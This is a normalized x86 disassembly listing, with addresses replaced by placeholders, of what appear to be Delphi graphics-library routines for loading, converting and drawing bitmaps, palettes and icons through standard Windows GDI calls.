cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424af0
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_4194ec
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
push 0x0
call GetDC
call sub_424960
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_429383
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_424d9c
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_402d28
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_4292eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4194ec
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_424960
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4292bf
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425058
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40f32c
call sub_424840
jmp r-xdata
xor eax eax
push ebp
push sub_429352
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_4194ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4292c6
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42938a
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40f32c
call sub_424840
jmp r-xdata
sub_4292c6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402d44
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42938a
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_403728
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42941f
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425058
mov [ ebp - 0x30 ] eax
sub_42943c
lea eax [ ebp - 0x9c ]
push eax
movzx eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_428dec
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429484
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_428b7c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_4194ec
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_403728
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_428dec
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_428f14
call sub_424840
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4294f4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_428b7c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_403728
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_42809c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42958f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_428dec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4295b8
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_42894c
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_428b7c
mov eax esi
call sub_428c8c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_428b7c
mov eax esi
call sub_428c8c
mov eax esi
call sub_428b08
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_42809c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_4284ac
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
movzx edx [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428dec
jmp r-xdata
push esp
movzx edx [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_428dec
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_427a38
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4296f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x28 ]
mov edx [ eax + 0x1c ]
mov ecx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edi
pop esi
pop ebx
retn
sub_429710
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_428b8c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
movzx eax bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_4284ac
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42978c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_428b7c
mov eax ebx
call sub_428b8c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_427a38
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_429824
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
movzx eax [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_428dec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_427930
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_4227d0
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_429829
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_404800
call sub_404854
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_427930
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429860
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4289cc
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
sub al 0x1
jb r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ rw-data ]
call sub_424828
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x5d ]
xor ecx ecx
mov edx 0x54
call sub_403728
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x5d ]
mov ecx 0x6
[ edi ] [ esi ]
mov [ ebp - 0x9 ] 0x0
xor edx edx
mov [ ebp - 0x49 ] edx
mov [ ebp - 0x45 ] 0x28
mov edx [ ebp - 0x59 ]
mov [ ebp - 0x41 ] edx
mov edx [ ebp - 0x55 ]
mov [ ebp - 0x3d ] edx
mov [ ebp - 0x39 ] 0x1
movzx edx bl
movzx edx [ edx + rw-data ]
mov [ ebp - 0x37 ] dx
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
sub bl 0x2
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec bl
je r-xdata
xor eax eax
push ebp
push sub_4299ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x5d ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4284ac
cmp [ ebp - 0x8 ] 0x0
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_424960
mov ebx eax
push ebx
call CreateHalftonePalette
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x1
push ebx
push 0x0
call ReleaseDC
jmp r-xdata
sub bl 0x2
je r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
mov [ ebp - 0x35 ] 0x3
mov [ ebp - 0x1d ] 0xf800
mov [ ebp - 0x19 ] 0x7e0
mov [ ebp - 0x15 ] 0x1f
jmp r-xdata
sub_4299c8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x28 ]
mov ecx [ eax + 0x20 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edi
pop esi
pop ebx
retn
sub_4299ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_403728
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_428b08
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_4257b4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_419524
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_419524
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_403728
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4288e0
movzx edx [ r-xdata ]
call sub_424638
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_424960
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
movzx eax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_4279ec
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_419524
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_419524
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
movzx edx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
movzx edx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
movzx eax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_419524
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_419524
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
movzx eax [ ebp + 0x70 ]
movzx ecx [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_419524
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_419524
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_424dd8
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_419524
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_4250fc
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
add eax eax
add eax eax
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_429cac
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_428b8c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_427a38
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_429d26
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_42809c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429d4c
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebp ecx
mov edi edx
mov esi eax
mov ebx [ esi + 0x28 ]
cmp edi [ ebx + 0x1c ]
jne r-xdata
mov eax esi
call sub_428b8c
push esi
push edi
lea esi [ ebx + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x8 ] ebp
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] ebp
push esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4284ac
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebp [ ebx + 0x20 ]
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
sub_429db0
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403f64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_429df8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425afc
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_427864
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_429e4c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_427868
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_429e7c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42a158
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_427864
mov eax [ esi + 0x28 ]
call sub_427868
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_416dc8
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_429edc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax esi
call sub_424638
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_429f38
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_429f74
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_4192e0
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_4194ec
movzx eax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_4253ac
jmp r-xdata
jmp r-xdata
call sub_42484c
sub_429fec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a079
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_429f38
cmp eax [ rw-data ]
jne r-xdata
call sub_42484c
mov eax esi
call sub_429f38
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_4258fc
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_403728
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_419524
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42a0a0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a12e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4192c0
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_4194ec
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4194ec
movzx eax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42a158
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_42484c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a133
mov eax [ ebp - 0x4 ]
call sub_403f64
call sub_404800
call sub_404854
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a158
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a198
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_427864
mov eax [ ebx + 0x28 ]
call sub_427868
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a238
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_429fec
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_419524
pop esi
pop ebx
retn
sub_42a288
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_424ea8
